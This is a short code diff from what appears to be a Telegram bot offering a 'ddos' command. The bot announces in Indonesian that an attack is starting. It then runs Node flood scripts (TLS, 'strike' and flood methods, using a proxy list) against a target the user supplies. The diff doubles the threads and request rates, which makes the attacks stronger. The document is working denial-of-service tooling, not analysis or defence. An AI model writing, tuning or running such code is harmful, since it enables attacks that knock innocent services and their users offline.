@@ -134,9 +134,9 @@ bot.command('ddos', async (ctx) => {
     const initialMessage = await ctx.reply(`Memulai serangan ke ${target} dengan metode ${methods} selama ${duration} detik.`);
 
     const attackMethods = {
-      tls: `node ./lib/mt/Tls.js ${target} ${duration} 100 10`,
-      strike: `node ./lib/mt/strike.js GET ${target} ${duration} 10 100 proxy.txt`,
-      flood: `node ./lib/mt/floodsX.js ${target} ${duration} 10 100 proxy.txt`,
+      tls: `node ./lib/mt/Tls.js ${target} ${duration} 200 20`,
+      strike: `node ./lib/mt/strike.js GET ${target} ${duration} 20 200 proxy.txt`,
+      flood: `node ./lib/mt/floodsX.js ${target} ${duration} 20 200 proxy.txt`,
     };
 
     if (attackMethods[methods]) {
